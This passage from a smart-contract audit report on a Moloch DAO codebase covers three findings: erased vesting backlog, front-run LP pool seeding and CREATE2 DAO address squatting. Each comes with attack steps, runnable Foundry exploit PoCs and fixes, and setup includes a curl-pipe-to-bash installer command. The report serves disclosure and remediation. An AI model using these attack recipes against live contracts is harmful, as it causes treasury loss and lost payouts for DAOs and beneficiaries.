Accrual accounting must be monotonic: if an entitlement is computed but not fully paid, the unpaid portion must remain represented in state until it is intentionally canceled by an authorized policy action. Permissionless claim helpers must not be able to cause irreversible state loss simply by executing during a temporary resource shortfall.

##### Defense in Depth
- Restrict `claim()` to the beneficiary or to explicitly approved relayers if permissionless third-party triggering is not required for protocol UX
- Emit both `owed` and `claimed` in the claim event so monitoring can alert operators whenever a partial payout occurs
- Add a dedicated pause/freeze mechanism for temporary treasury shortfalls instead of relying on underfunded partial claims

##### Verification Guidance
- Add a regression test where `pending > claimable`, a partial claim occurs, the DAO is later refilled, and the beneficiary can still recover the preserved backlog
- Add a regression test where a full claim still zeroes out the backlog and behaves exactly like the current happy path
- Add a test covering `setRate()` to confirm the chosen semantics for carried unpaid accrual are enforced and documented

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
  ```bash
  curl -L https://foundry.paradigm.xyz | bash
  foundryup
  ```
- **Target Setup:**
  ```bash
  cd $(git rev-parse --show-toplevel)
  ```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Moloch} from "../src/Moloch.sol";
import {SafeSummoner, Call} from "../src/peripheral/SafeSummoner.sol";
import {TapVest} from "../src/peripheral/TapVest.sol";

contract TapVestBacklogLossPoC is Test {
    SafeSummoner internal safe;
    TapVest internal tap;

    address internal alice = address(0xA11CE);
    address internal beneficiary = address(0xBEEF);

    function setUp() public {
        vm.createSelectFork("main");
        safe = new SafeSummoner();
        tap = new TapVest();
    }

    function _deployWithTap(bytes32 salt, uint128 rate, uint256 budget)
        internal
        returns (address dao)
    {
        address[] memory h = new address[](1);
        h[0] = alice;
        uint256[] memory s = new uint256[](1);
        s[0] = 100e18;

        dao = safe.predictDAO(salt, h, s);

        Call[] memory extra = new Call[](2);
        extra[0] = Call(dao, 0, abi.encodeCall(Moloch.setAllowance, (address(tap), address(0), budget)));
        extra[1] = Call(address(tap), 0, abi.encodeCall(tap.configure, (address(0), beneficiary, rate)));

        SafeSummoner.SafeConfig memory c;
        c.proposalThreshold = 1e18;
        c.proposalTTL = 7 days;

        address deployed = safe.safeSummon("TapDAO", "TAP", "", 1000, true, address(0), salt, h, s, c, extra);
        assertEq(deployed, dao);

        vm.deal(dao, 100 ether);
    }

    function test_ThirdPartyCanEraseAccruedBacklog() public {
        uint128 rate = 1e18 / uint128(1 days);
        address dao = _deployWithTap(bytes32(uint256(1)), rate, 100e18);

        vm.warp(block.timestamp + 10 days);
        assertApproxEqAbs(tap.pending(dao), 10e18, 1e15);

        // DAO is only temporarily underfunded when the attacker strikes.
        vm.deal(dao, 0.5 ether);
        assertEq(tap.claimable(dao), 0.5 ether);

        // Any third party can grief the beneficiary.
        vm.prank(address(0xCAFE));
        tap.claim(dao);

        // DAO later refills the treasury, but the accrued backlog is gone.
        vm.deal(dao, 100 ether);
        assertEq(tap.pending(dao), 0);
        assertEq(tap.claimable(dao), 0);

        vm.warp(block.timestamp + 1 days);
        assertApproxEqAbs(tap.claimable(dao), 1e18, 1e15); // only fresh accrual remains
    }
}
```

##### Steps
1. **Create the PoC test file**
```bash
cat > test/TapVestBacklogLossPoC.t.sol <<'EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Moloch} from "../src/Moloch.sol";
import {SafeSummoner, Call} from "../src/peripheral/SafeSummoner.sol";
import {TapVest} from "../src/peripheral/TapVest.sol";

contract TapVestBacklogLossPoC is Test {
    SafeSummoner internal safe;
    TapVest internal tap;
    address internal alice = address(0xA11CE);
    address internal beneficiary = address(0xBEEF);

    function setUp() public {
        vm.createSelectFork("main");
        safe = new SafeSummoner();
        tap = new TapVest();
    }

    function _deployWithTap(bytes32 salt, uint128 rate, uint256 budget)
        internal
        returns (address dao)
    {
        address[] memory h = new address[](1);
        h[0] = alice;
        uint256[] memory s = new uint256[](1);
        s[0] = 100e18;

        dao = safe.predictDAO(salt, h, s);

        Call[] memory extra = new Call[](2);
        extra[0] = Call(dao, 0, abi.encodeCall(Moloch.setAllowance, (address(tap), address(0), budget)));
        extra[1] = Call(address(tap), 0, abi.encodeCall(tap.configure, (address(0), beneficiary, rate)));

        SafeSummoner.SafeConfig memory c;
        c.proposalThreshold = 1e18;
        c.proposalTTL = 7 days;

        address deployed = safe.safeSummon("TapDAO", "TAP", "", 1000, true, address(0), salt, h, s, c, extra);
        assertEq(deployed, dao);
        vm.deal(dao, 100 ether);
    }

    function test_ThirdPartyCanEraseAccruedBacklog() public {
        uint128 rate = 1e18 / uint128(1 days);
        address dao = _deployWithTap(bytes32(uint256(1)), rate, 100e18);

        vm.warp(block.timestamp + 10 days);
        assertApproxEqAbs(tap.pending(dao), 10e18, 1e15);

        vm.deal(dao, 0.5 ether);
        vm.prank(address(0xCAFE));
        tap.claim(dao);

        vm.deal(dao, 100 ether);
        assertEq(tap.pending(dao), 0);
        assertEq(tap.claimable(dao), 0);

        vm.warp(block.timestamp + 1 days);
        assertApproxEqAbs(tap.claimable(dao), 1e18, 1e15);
    }
}
EOF
```
- Expected: the file is written successfully
2. **Run the PoC**
```bash
forge test --match-path test/TapVestBacklogLossPoC.t.sol -vv
```
- Expected: the test passes
3. **Inspect the assertions**
- Expected: after the third-party `tap.claim(dao)` call, `pending(dao)` and `claimable(dao)` both drop to zero immediately after the DAO is refilled, proving that the pre-existing 10-day backlog was not preserved

##### Verification
Confirm that the test only refills the DAO *after* the attacker-triggered partial claim, yet the beneficiary cannot recover the earlier 10-day accrual. The critical verification points are `assertEq(tap.pending(dao), 0)` after refill and the later `claimable` value of only ~1 ETH after one more day.

##### Outcome
The attacker gains the ability to permanently destroy already-accrued tap compensation whenever the DAO is temporarily short on balance or temporarily constrained by allowance. The attacker does not need governance privileges and does not need to receive the funds; the security impact is forced financial loss and denial of previously earned payout to the beneficiary.

</details>

---

<details>
<summary><strong>5. LP seed hook allows attacker to pre-create the official pool and set launch pricing</strong></summary>

> **Review: Valid novel finding targeting LPSeedSwapHook peripheral. High severity accepted for peripheral scope.** The pre-seed front-running window is a genuine design gap — `poolDAO[poolId]` is unset until `seed()` runs, so `beforeAction()` permits the attacker's early `addLiquidity`. Same LPSeedSwapHook root cause cluster as #3 and #9 but distinct attack vector (price manipulation vs ownership takeover). Not a Moloch.sol core finding. **V2 hardening:** reserve the deterministic pool ID at `configure()` time, not `seed()` time; set nonzero `amount0Min`/`amount1Min` in the `seed()` call.

**Winfunc ID:** `19`

**CVSS Score:** `8.1`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L`

**Vulnerability Type:** `CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization`

**Source Location:** `src/peripheral/LPSeedSwapHook.sol:326:beforeAction()`

**Sink Location:** `src/peripheral/LPSeedSwapHook.sol:265:seed()`

#### Summary

An attacker can pre-create a DAO's hooked ZAMM pool before LPSeedSwapHook seeding executes, leading to attacker-controlled initial pricing and misallocation of DAO treasury assets during liquidity seeding.

#### Root Cause

`beforeAction()` only blocks LP operations when `poolDAO[poolId]` already points to a DAO and that DAO is still unseeded, but `poolDAO[poolId]` is populated only inside `seed()` after the pool key has already been exposed and after the frontrun window has existed. Compounding this, `seed()` sets `cfg.seeded = true` before calling ZAMM and then calls `ZAMM.addLiquidity(..., 0, 0, ...)`, so the transient `SEEDING_SLOT` guard never meaningfully protects the first initialization and the DAO will join any attacker-created pool at the attacker-chosen reserve ratio.

#### Impact

###### Confirmed Impact
An unprivileged actor can become the first LP for the DAO's intended hooked pool, set the official initial reserve ratio, and force `seed()` to add DAO assets into that attacker-created pool instead of creating a fresh one. This can cause permanent launch-price skew and partial or imbalanced seeding because `seed()` accepts whatever ratio already exists and only refunds leftovers after the fact.

###### Potential Follow-On Impact
If the paired assets have external value or secondary liquidity, the attacker can arbitrage the mispriced pool or unwind their LP position after DAO funds enter, converting the forced mispricing into direct treasury loss. Because `seed()` is one-shot, remediation may require governance intervention or migration to a new pool/hook address, which can disrupt launch plans and downstream integrations.

#### Source-to-Sink Trace

1. **[src/peripheral/LPSeedSwapHook.sol:195](../src/peripheral/LPSeedSwapHook.sol#L195)**

   ```solidity
   seeds[msg.sender] = SeedConfig({ tokenA: tokenA, tokenB: tokenB, amountA: amountA, amountB: amountB, ... seeded: false });
   ```

   The DAO's target pair and unseeded status are stored on-chain in a public mapping, giving attackers the exact assets and timing window for the future seed.

2. **[src/peripheral/LPSeedSwapHook.sol:319](../src/peripheral/LPSeedSwapHook.sol#L319)**

   ```solidity
   return uint256(uint160(address(this))) | FLAG_BEFORE;
   ```

   The hook component of the future pool key is deterministic and public, so an attacker can derive the same hooked `PoolKey` and `poolId` that `seed()` will later use.

3. **[src/peripheral/LPSeedSwapHook.sol:334](../src/peripheral/LPSeedSwapHook.sol#L334)**

   ```solidity
   address dao = poolDAO[poolId]; ... if (dao != address(0) && !seeds[dao].seeded) { ... if (!seeding) revert NotReady(); } return 0;
   ```

   When ZAMM invokes the hook for the attacker's early `addLiquidity`, `poolDAO[poolId]` is still unset, so the guarded branch is skipped and the LP action is allowed instead of blocked.

4. **[src/peripheral/LPSeedSwapHook.sol:222](../src/peripheral/LPSeedSwapHook.sol#L222)**

   ```solidity
   cfg.seeded = true;
   ```

   `seed()` marks the DAO as seeded before the ZAMM call, which means the transient `SEEDING_SLOT` path in `beforeAction()` is never actually consulted during the legitimate seed transaction.

5. **[src/peripheral/LPSeedSwapHook.sol:250](../src/peripheral/LPSeedSwapHook.sol#L250)**

   ```solidity
   uint256 poolId = uint256(keccak256(abi.encode(key))); poolDAO[poolId] = dao;
   ```

   Only inside `seed()` does the contract finally associate the deterministic pool with the DAO, so any attacker-created pool with the same key becomes the official DAO pool at this point.

6. **[src/peripheral/LPSeedSwapHook.sol:265](../src/peripheral/LPSeedSwapHook.sol#L265)**

   ```solidity
   ZAMM.addLiquidity{value: ethValue}(key, amt0, amt1, 0, 0, dao, block.timestamp);
   ```

   SINK: DAO treasury assets are added to the already-existing attacker-initialized pool with zero minimum bounds, accepting the attacker-chosen reserve ratio and enabling partial/imbalanced seeding.

#### Exploit Analysis

##### Attack Narrative
The attacker is an ordinary on-chain participant watching for DAO deployments or configurations that use `LPSeedSwapHook`. Once the DAO's seed parameters are on-chain, the attacker can derive the exact same hooked `PoolKey` that the DAO will later use because the tokens are public and the hook component is deterministic. Before anyone calls `seed()`, the attacker simply creates that pool through the public ZAMM `addLiquidity` entrypoint.

When ZAMM consults `LPSeedSwapHook.beforeAction()`, the hook sees `poolDAO[poolId] == address(0)` and treats the operation as an unregistered pool, returning success instead of blocking it. Later, once the seed gate is satisfied, the attacker or any third party triggers `seed(dao)`. The DAO then joins the already-initialized pool with `amount0Min = amount1Min = 0`, so the initial price and reserve ratio are no longer under DAO control.

##### Prerequisites
- **Attacker Control/Position:** Ability to submit ordinary on-chain transactions and optionally use MEV/public mempool monitoring
- **Required Access/Placement:** Unauthenticated public user
- **User Interaction:** None
- **Privileges/Configuration Required:** A DAO must have configured `LPSeedSwapHook` and not yet executed `seed()`. The risk is highest for intended delayed-seed flows using `deadline`, `shareSale`, or `minSupply`, but any gap between configure and seed is enough.
- **Knowledge Required:** DAO address or `Configured` event, configured token pair/amounts, and the public hook singleton address
- **Attack Complexity:** Low — the pool key is deterministic, the hook is public, and the contract itself is designed to leave a pre-seed window for many deployments

##### Attack Steps
1. Read `seeds[dao]` or the `Configured` event to learn the target pair and planned seed amounts.
2. Canonicalize the token ordering and compute the exact `PoolKey` using `hookFeeOrHook()`.
3. Call `ZAMM.addLiquidity()` first with that same `PoolKey` but with an attacker-chosen reserve ratio.
4. ZAMM invokes `beforeAction()`, which allows the LP action because `poolDAO[poolId]` is still unset.
5. Once the configured gate is satisfied, call `seed(dao)` yourself or wait for someone else to call it.
6. `seed()` registers the already-existing pool as the DAO pool and adds DAO funds with `amount0Min = amount1Min = 0`, preserving the attacker-set ratio.
7. Optionally arbitrage the mispriced pool or exit the attacker LP position after DAO funds have entered.

##### Impact Breakdown
- **Confirmed Impact:** The attacker can seize control of the official initial reserve ratio for the DAO's hooked pool and force DAO seeding into that pool, causing launch-price skew and partial/imbalanced treasury deployment.
- **Potential Follow-On Impact:** If the tokens have meaningful external markets or the attacker can source one side cheaply, the mispricing can be monetized through arbitrage, swaps, or LP withdrawal after DAO funds are committed. The precise profit depends on market conditions and token liquidity.
- **Confidentiality:** None — the bug does not expose secret data.
- **Integrity:** High — it corrupts the DAO's intended pool initialization and treasury deployment semantics.
- **Availability:** Low — the one-shot seed flow may require governance intervention or migration to recover a clean launch state.

#### Recommended Fix

Reserve the deterministic pool ID before seeding becomes possible, and make `beforeAction()` consult that reservation rather than `poolDAO` alone. Also move `cfg.seeded = true` until after a successful ZAMM liquidity add so the transient seeding flag actually gates the legitimate first-LP path.

Before:
```solidity
// configure(): only stores by DAO
seeds[msg.sender] = SeedConfig({ ... seeded: false });

// seed(): registration happens too late and zero mins assume first-LP status
cfg.seeded = true;
uint256 poolId = uint256(keccak256(abi.encode(key)));
poolDAO[poolId] = dao;
(uint256 used0, uint256 used1, uint256 liq) =
    ZAMM.addLiquidity{value: ethValue}(key, amt0, amt1, 0, 0, dao, block.timestamp);
```

After:
```solidity
mapping(uint256 poolId => address dao) public reservedPoolDAO;

function configure(
    address tokenA,
    uint128 amountA,
    address tokenB,
    uint128 amountB,
    uint40 deadline,
    address shareSale,
    uint128 minSupply
) public {
    // existing validation...
    seeds[msg.sender] = SeedConfig({
        tokenA: tokenA,
        tokenB: tokenB,
        amountA: amountA,
        amountB: amountB,
        feeBps: 0,
        deadline: deadline,
        shareSale: shareSale,
        minSupply: minSupply,
        seeded: false
    });

    (address t0, address t1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
    IZAMM.PoolKey memory key = IZAMM.PoolKey({
        id0: 0,
        id1: 0,
        token0: t0,
        token1: t1,
        feeOrHook: hookFeeOrHook()
    });
    reservedPoolDAO[uint256(keccak256(abi.encode(key)))] = msg.sender;
}

function beforeAction(bytes4 sig, uint256 poolId, address, bytes calldata)
    external
    payable
    override
    returns (uint256 feeBps)
{
    if (msg.sender != address(ZAMM)) revert Unauthorized();

    address dao = reservedPoolDAO[poolId];
    bool isSwap = sig == IZAMM.swapExactIn.selector
        || sig == IZAMM.swapExactOut.selector
        || sig == IZAMM.swap.selector;

    if (!isSwap) {
        if (dao != address(0) && !seeds[dao].seeded) {
            bool seeding;
            assembly ("memory-safe") { seeding := tload(SEEDING_SLOT) }
            if (!seeding) revert NotReady();
        }
        return 0;
    }

    if (dao == address(0) || !seeds[dao].seeded) revert NotReady();
    uint16 fee = seeds[dao].feeBps;
    return fee == 0 ? DEFAULT_FEE_BPS : fee;
}

function seed(address dao, uint256 amount0Min, uint256 amount1Min)
    public
    returns (uint256 liquidity)
{
    SeedConfig storage cfg = seeds[dao];
    // checks...

    assembly ("memory-safe") { tstore(SEEDING_SLOT, 1) }
    (uint256 used0, uint256 used1, uint256 liq) =
        ZAMM.addLiquidity{value: ethValue}(key, amt0, amt1, amount0Min, amount1Min, dao, block.timestamp);
    assembly ("memory-safe") { tstore(SEEDING_SLOT, 0) }

    poolDAO[poolId] = dao;
    cfg.seeded = true;
    liquidity = liq;
}
```

##### Security Principle
Authorization decisions for privileged initialization must be based on state that is committed before an attacker can race the action. Separately, slippage assumptions that are only safe for the first LP must never be used after an attacker has any chance to create the pool first.

##### Defense in Depth
- Require caller-supplied or DAO-configured minimum amounts in `seed()` so the transaction reverts if the pool ratio differs materially from the intended launch ratio.
- Emit and monitor a reserved `poolId` during `configure()` so off-chain tooling can alert if an unexpected pool already exists before seeding.
- Add an explicit `view` helper that returns the reserved pool key and whether the pool already exists, and refuse seeding if external reserves are nonzero unless a DAO-approved override is set.

##### Verification Guidance
- Add a regression test where an attacker calls `ZAMM.addLiquidity()` with the reserved hooked `PoolKey` before `seed()`; it must revert with `NotReady()`.
- Add a regression test showing a legitimate `seed()` call succeeds when `SEEDING_SLOT` is set and that the DAO remains the first LP with exact reserve ratios.
- Add a slippage regression test proving `seed()` reverts if existing reserves do not match the DAO-approved launch ratio.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:** `curl -L https://foundry.paradigm.xyz | bash && foundryup`
- **Target Setup:** `MAINNET_RPC_URL=<your_rpc_url> forge test --match-contract LPSeedPrecreatePoC --match-test test_AttackerCanPreCreateOfficialPool -vv`

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Moloch} from "../src/Moloch.sol";
import {SafeSummoner, Call} from "../src/peripheral/SafeSummoner.sol";
import {LPSeedSwapHook, IZAMM} from "../src/peripheral/LPSeedSwapHook.sol";

IZAMM constant LIVE_ZAMM = IZAMM(0x000000000000040470635EB91b7CE4D132D616eD);

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LPSeedPrecreatePoC is Test {
    SafeSummoner internal safe;
    LPSeedSwapHook internal lpSeed;
    MockERC20 internal tokenA;
    MockERC20 internal tokenB;

    address internal attacker = address(0xBEEF);

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
        safe = new SafeSummoner();
        lpSeed = new LPSeedSwapHook();
        tokenA = new MockERC20("TokenA", "TKA");
        tokenB = new MockERC20("TokenB", "TKB");
    }

    function test_AttackerCanPreCreateOfficialPool() public {
        bytes32 salt = bytes32(uint256(1));
        address[] memory holders = new address[](1);
        holders[0] = address(this);
        uint256[] memory initShares = new uint256[](1);
        initShares[0] = 1e18;

        address dao = safe.predictDAO(salt, holders, initShares);

        uint128 daoAmtA = 1000e18;
        uint128 daoAmtB = 1000e18; // DAO intends a 1:1 initial price

        Call[] memory extra = new Call[](3);
        extra[0] = Call(
            dao,
            0,
            abi.encodeCall(Moloch.setAllowance, (address(lpSeed), address(tokenA), daoAmtA))
        );
        extra[1] = Call(
            dao,
            0,
            abi.encodeCall(Moloch.setAllowance, (address(lpSeed), address(tokenB), daoAmtB))
        );
        extra[2] = Call(
            address(lpSeed),
            0,
            abi.encodeCall(lpSeed.configure, (address(tokenA), daoAmtA, address(tokenB), daoAmtB, 0, address(0), 0))
        );

        SafeSummoner.SafeConfig memory cfg;
        cfg.proposalThreshold = 1e18;
        cfg.proposalTTL = 7 days;

        safe.safeSummon("PoCDAO", "POC", "", 1000, true, address(0), salt, holders, initShares, cfg, extra);

        // Fund the DAO with the exact seed amounts.
        tokenA.mint(dao, daoAmtA);
        tokenB.mint(dao, daoAmtB);

        // Give attacker enough tokens to create a tiny but highly skewed first-LP position.
        tokenA.mint(attacker, 100e18);
        tokenB.mint(attacker, 100e18);

        address t0 = address(tokenA) < address(tokenB) ? address(tokenA) : address(tokenB);
        address t1 = address(tokenA) < address(tokenB) ? address(tokenB) : address(tokenA);
        IZAMM.PoolKey memory key = IZAMM.PoolKey({
            id0: 0,
            id1: 0,
            token0: t0,
            token1: t1,
            feeOrHook: lpSeed.hookFeeOrHook()
        });
        uint256 poolId = uint256(keccak256(abi.encode(key)));

        assertEq(lpSeed.poolDAO(poolId), address(0));

        // Attacker chooses a 1:100 starting ratio before the DAO seeds.
        vm.startPrank(attacker);
        tokenA.approve(address(LIVE_ZAMM), type(uint256).max);
        tokenB.approve(address(LIVE_ZAMM), type(uint256).max);
        LIVE_ZAMM.addLiquidity(key, 1e18, 100e18, 0, 0, attacker, block.timestamp);
        vm.stopPrank();

        // The hook did not stop first-LP pool creation.
        assertEq(lpSeed.poolDAO(poolId), address(0));
        (uint112 r0Before, uint112 r1Before,,,,, uint256 supplyBefore) = LIVE_ZAMM.pools(poolId);
        assertEq(r0Before, 1e18);
        assertEq(r1Before, 100e18);
        assertGt(supplyBefore, 0);

        // Anyone can now trigger the DAO seed into the attacker's pool.
        lpSeed.seed(dao);

        // The attacker-created pool becomes the DAO's official pool only now.
        assertEq(lpSeed.poolDAO(poolId), dao);

        // DAO intended 1000:1000, but it was forced into the pre-existing 1:100 ratio.
        // Exactly one side is mostly refunded because the DAO was not the first LP.
        uint256 daoBalA = tokenA.balanceOf(dao);
        uint256 daoBalB = tokenB.balanceOf(dao);
        assertTrue((daoBalA == 990e18 && daoBalB == 0) || (daoBalA == 0 && daoBalB == 990e18));

        // Final pool still reflects the attacker-chosen price, not the DAO's intended 1:1 launch ratio.
        (uint112 r0After, uint112 r1After,,,,,) = LIVE_ZAMM.pools(poolId);
        assertEq(uint256(r1After), uint256(r0After) * 100);
    }
}
```

##### Steps
1. **Create a DAO with LPSeedSwapHook configured but not yet seeded**
```bash
MAINNET_RPC_URL=<your_rpc_url> forge test --match-contract LPSeedPrecreatePoC --match-test test_AttackerCanPreCreateOfficialPool -vv
```
- Expected: Foundry runs on a mainnet fork and deploys `SafeSummoner`, `LPSeedSwapHook`, two mock ERC20s, and a DAO configured to seed a hooked pool at a 1:1 ratio.

2. **Front-run pool creation through ZAMM**
- The PoC calls `LIVE_ZAMM.addLiquidity()` first with the same `PoolKey` that `seed()` will later use, but at a 1:100 ratio.
- Expected: The call succeeds even though the hook comments say pre-seed `addLiquidity` should be blocked.

3. **Trigger the DAO seed**
- The PoC calls `lpSeed.seed(dao)` after the attacker-created pool already exists.
- Expected: `seed()` succeeds, `poolDAO[poolId]` is set only at this stage, and the DAO receives a large refund on one asset because it was forced to join the attacker-created price curve instead of creating its own 1:1 pool.

##### Verification
Check the test assertions:
- `lpSeed.poolDAO(poolId) == address(0)` even after attacker `addLiquidity`, proving the hook allowed first-LP creation for an unregistered pool.
- DAO balances after `seed()` show a `990e18` refund on one side, proving the DAO was not the first LP and could not seed at its intended 1:1 ratio.
- Final pool reserves satisfy `r1After == r0After * 100`, proving the attacker-controlled 1:100 starting price persisted through the DAO seed.

##### Outcome
The attacker has turned the DAO's official hooked pool into an attacker-initialized pool. The DAO no longer controls first-LP price discovery, its treasury assets are seeded at the attacker's chosen reserve ratio, and the resulting mispricing can be exploited further through arbitrage or LP unwinds if the paired assets have external value.

</details>

---

<details>
<summary><strong>6. Predictable SafeSummoner deployment address can be squatted and maliciously initialized</strong></summary>

> **Review: Variant of KF#9 (CREATE2 salt not bound to msg.sender). Severity adjusted to Low-Medium (per V1.5 assessment).** This extends KF#9 with a concrete SafeSummoner exploit chain but the fundamental constraint remains: `initHolders` and `initShares` are in the salt, so the attacker cannot substitute themselves as share holders. The V1.5 assessment (SECURITY.md) and Cantina's MAJEUR-17 already document this class. The SafeSummoner framing is sharper (attacker controls `initCalls` including module wiring) but the legitimate deployer would see the misconfigured DAO and redeploy with a different salt. No funds are at risk since the DAO is empty at deployment time. **Severity: Low-Medium (per KF#9 / V1.5 assessment).**

**Winfunc ID:** `20`

**CVSS Score:** `8.1`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`

**Vulnerability Type:** `CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')`

**Source Location:** `src/peripheral/SafeSummoner.sol:217:safeSummon()`

**Sink Location:** `src/Moloch.sol:2084:Summoner.summon()`

#### Summary

An attacker can front-run DAO deployment in the SafeSummoner wrapper, leading to permanent address squatting and attacker-controlled initialization at the victim-expected DAO address.

#### Root Cause

`SafeSummoner._predictDAO()` derives the DAO address only from `keccak256(abi.encode(initHolders, initShares, salt))` and the fixed `SUMMONER` address, while `orgName`, `orgSymbol`, `orgURI`, `quorumBps`, `ragequittable`, `renderer`, and the final `initCalls` are not bound to the CREATE2 slot. `safeSummon()` and `safeSummonDAICO()` then forward deployment to the public `Summoner.summon()` function, which uses the same narrow salt derivation and subsequently calls `Moloch.init()`, where attacker-chosen `initCalls` are executed with DAO authority.

#### Impact

###### Confirmed Impact
A mempool observer can reuse only `(salt, initHolders, initShares)` to win the CREATE2 race, deploy a DAO at the victim-expected address first, and cause the victim deployment to revert on collision. The squatted DAO can be initialized with attacker-chosen permissions or governance settings, so the address the victim expected to represent a safely-configured DAO instead hosts attacker-controlled state.

###### Potential Follow-On Impact
If users, bots, or integrations later trust or fund the predicted address, attacker-installed `setAllowance`/`setPermit` rights or malicious modules can be used to drain or misuse those assets. Additional downstream harm depends on off-chain behavior such as pre-announcing, pre-funding, bookmarking, or integrating with the deterministic address before verifying the deployed bytecode and initialization state.

#### Source-to-Sink Trace

1. **[src/peripheral/SafeSummoner.sol:217](../src/peripheral/SafeSummoner.sol#L217)**

   ```solidity
   bytes32 salt, address[] calldata initHolders, uint256[] calldata initShares,
   ```

   The public wrapper accepts caller-controlled deterministic deployment inputs. These three values are the only components later used to select the DAO CREATE2 slot.

2. **[src/peripheral/SafeSummoner.sol:227](../src/peripheral/SafeSummoner.sol#L227)**

   ```solidity
   address daoAddr = _predictDAO(salt, initHolders, initShares);
   ```

   `safeSummon()` derives the expected DAO address before building init calls, so off-chain users and modules rely on this prediction.

3. **[src/peripheral/SafeSummoner.sol:944](../src/peripheral/SafeSummoner.sol#L944)**

   ```solidity
   bytes32 _salt = keccak256(abi.encode(initHolders, initShares, salt));
   ```

   `_predictDAO()` binds the address only to `(initHolders, initShares, salt)`. It omits `msg.sender`, metadata, governance config, and the final init call set.

4. **[src/peripheral/SafeSummoner.sol:233](../src/peripheral/SafeSummoner.sol#L233)**

   ```solidity
   dao = SUMMONER.summon{value: msg.value}(..., salt, initHolders, initShares, calls);
   ```

   After validating a safe config and generating `calls`, the wrapper forwards deployment to the public Summoner without binding those security-relevant values into the address namespace.

5. **[src/Moloch.sol:2078](../src/Moloch.sol#L2078)**

   ```solidity
   bytes32 _salt = keccak256(abi.encode(initHolders, initShares, salt));
   ```

   The public Summoner repeats the same narrow salt derivation, so any attacker who reuses the same triple competes for the exact same DAO address.

6. **[src/Moloch.sol:2084](../src/Moloch.sol#L2084)**

   ```solidity
   dao := create2(callvalue(), 0x0e, 0x36, _salt)
   ```

   This CREATE2 operation is the collision point. A frontrunner who executes it first permanently occupies the victim-expected DAO address and causes later deployments for that slot to revert.

7. **[src/Moloch.sol:244](../src/Moloch.sol#L244)**

   ```solidity
   (bool ok,) = initCalls[i].target.call{value: initCalls[i].value}(initCalls[i].data);
   ```

   The winning deployment immediately executes attacker-chosen `initCalls` with DAO authority, enabling malicious `onlyDAO` state such as allowances, permits, or hostile governance parameters at the squatted address.

#### Exploit Analysis

##### Attack Narrative
The attacker is an arbitrary network participant watching the public mempool for `safeSummon(...)` or `safeSummonDAICO(...)` transactions. Once a victim deployment is seen, the attacker copies only the `salt`, `initHolders`, and `initShares` parameters and submits a competing `Summoner.summon(...)` transaction with higher priority fees, but with attacker-chosen metadata and `initCalls`.

Because both `SafeSummoner._predictDAO()` and `Summoner.summon()` derive the CREATE2 slot from only those three values, the attacker wins the exact address the victim and any observers predicted. `Moloch.init()` then executes the attacker-supplied `initCalls` with DAO authority, allowing direct installation of malicious allowances, permits, or governance settings before the victim transaction reverts on collision. Value theft requires later funding or trust in that address, but the address squatting and malicious initialization are directly confirmed by the code path.

##### Prerequisites
- **Attacker Control/Position:** Control of an EOA or contract that can submit transactions to the same public chain/mempool
- **Required Access/Placement:** Unauthenticated
- **User Interaction:** Required — a victim must attempt a DAO deployment or publicly reveal the deployment parameters
- **Privileges/Configuration Required:** No privileged access; standard public mempool conditions are sufficient
- **Knowledge Required:** The attacker must know or observe the victim's `salt`, `initHolders`, and `initShares`
- **Attack Complexity:** Low — the attacker only needs to copy a subset of calldata and submit a higher-priority transaction; no cryptographic break or governance power is needed

##### Attack Steps
1. Observe a pending `SafeSummoner.safeSummon(...)` or `safeSummonDAICO(...)` transaction.
2. Extract `salt`, `initHolders`, and `initShares` from calldata.
3. Submit `Summoner.summon(...)` or another SafeSummoner call with the same three values but attacker-chosen metadata and malicious `initCalls`.
4. Win block inclusion first so `create2` deploys at the victim-expected address.
5. Let the victim transaction revert on collision.
6. Use the attacker-installed permissions later (for example `setAllowance` + `spendAllowance`, or `setPermit` + `spendPermit`) if any value is sent to or trusted at the squatted address.

##### Impact Breakdown
- **Confirmed Impact:** Permanent squatting of the victim-expected DAO address, malicious initialization of that address, and denial of the legitimate deployment at the chosen deterministic address.
- **Potential Follow-On Impact:** Later asset theft or unsafe integrations if third parties pre-fund, announce, bookmark, or programmatically trust the deterministic address without verifying the actual deployed init state.
- **Confidentiality:** None — the exploit does not directly expose protected data.
- **Integrity:** High — the attacker can install unauthorized capabilities and hostile governance state at the address users expected to belong to the victim deployment.
- **Availability:** High — the legitimate deployment at the chosen address is permanently blocked once the attacker wins the CREATE2 race.

#### Recommended Fix

Bind the deterministic address to the full deployment intent and to the caller before forwarding to `Summoner.summon()`. At minimum, derive a wrapper-specific salt from `msg.sender` and a hash of the final init payload, then use that derived salt consistently in both prediction and deployment. Apply the same fix to `safeSummonDAICO()` and any preset path that ultimately calls `Summoner.summon()`.

**Before**
```solidity
address daoAddr = _predictDAO(salt, initHolders, initShares);
Call[] memory calls = _buildCalls(daoAddr, config, extraCalls);

dao = SUMMONER.summon{value: msg.value}(
    orgName,
    orgSymbol,
